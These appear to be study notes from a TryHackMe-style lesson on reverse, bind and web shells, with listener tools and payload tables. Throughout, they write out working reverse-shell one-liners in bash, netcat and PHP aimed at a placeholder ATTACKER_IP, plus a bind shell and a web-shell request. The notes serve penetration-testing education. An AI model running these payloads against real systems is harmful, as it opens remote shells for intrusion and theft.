# Shells Overview

### Basics

**Shell** - **software** that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface.

Useful terms:

- **Data Exfiltration** - Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it
- **Persistence and Maintenance Access** - Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage
- **Pivoting** - Accessing other systems on the Network after getting initial access

---
### Reverse shell

**Reverse shell** - is a technique where a compromised target system initiates a connection back to an attacker’s machine, giving the attacker interactive access to the target’s command shell. It can help bypass certain firewall restrictions because the connection is initiated from inside the target network.  

example:  

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

Then attacker can use: `nc -lvnp 443` to connect

### Bind Shell

bind shell - bind a port on the compromised system and listen for a connection

>A **reverse shell** makes the machine running the shell initiate an outgoing connection to the remote host.  
A **bind shell** makes the machine running the shell listen on a port, and the remote host connects to it.

example:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

then attacker uses: (`-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.)
```bash
nc -nv TARGET_IP 8080
```

>listening below port 1024 requires root access

### Shell Listeners

There are many shell listeners:

1. **Rlwrap** - allows the use of features like arrow keys and history. Example: `rlwrap nc -lvnp 443`
2. **Ncat** - improved version of Netcat, provides extra features, like encryption (SSL). Example: `ncat -lvnp 4444`
3. **Socat** - creates a socket connection. Example: `socat -d -d TCP-LISTEN:443 STDOUT`

### Shell Payloads

**Shell Payload** - command or script that exposes the shell to an incoming connection

Examples:
1. Bash

| Type                                                | Description                                                                                            | Command                                                                                                     |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| **Normal Bash Reverse Shell**                       | interactive bash shell that redirects input and output through a TCP connection                        | `target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`                                              |
| **Bash Read Line** **Reverse Shell**                | it will read and execute commands from the socket                                                      | `target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done` |
| **Bash With File Descriptor 196** **Reverse Shell** | It allows the shell to read commands from the network and send output back through the same connection | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`                                          |

2. PHP

| Type                                                | Description                                                                                                    | Command                                                                                          |
| --------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **PHP Reverse Shell Using the exec Function**       | creates a socket connection to the attacker's IP on port `443` and uses the `exec` function to execute a shell | `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`       |
| **PHP Reverse Shell Using the shell_exec Function** | uses the `shell_exec` function                                                                                 | `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'` |
| **PHP Reverse Shell Using the system Function**     | employs the `system` function, which executes the command and outputs the result to the browser                | `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`     |
| **PHP Reverse Shell Using the passthru Function**   | The `passthru` function executes a command and sends raw output back to the browser                            | `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`   |
| **PHP Reverse Shell Using the popen Function**      | uses `popen` to open a process file pointer                                                                    | `target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` |

3. Python

| Type                                                        | Description                                                                                                                                              | Command |
| ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- |
| **Python Reverse Shell by Exporting Environment Variables** | sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output | below   |
| **Python Reverse Shell Using the subprocess Module**        | uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell                                               | below   |
| **Short Python Reverse Shell**                              | creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`                        | below   |

### Web Shell

**Web shell** - script that executes commands through compromised web server **(malicious script uploaded to a vulnerable web application to gain unauthorized access).** Usually it is a file containing the code that executes commands and handles files.

Example of using command on web shell: (whoami command)
```
http://victim.com/uploads/shell.php?cmd=whoami
```

---

### TLDR

**Reverse Shells** establish a connection from a compromised machine back to an attacker's system. **Bind Shells**, on the other hand, listen for incoming connections on a compromised machine, and **Web Shells** offer attackers a unique avenue for exploiting vulnerabilities in web applications.
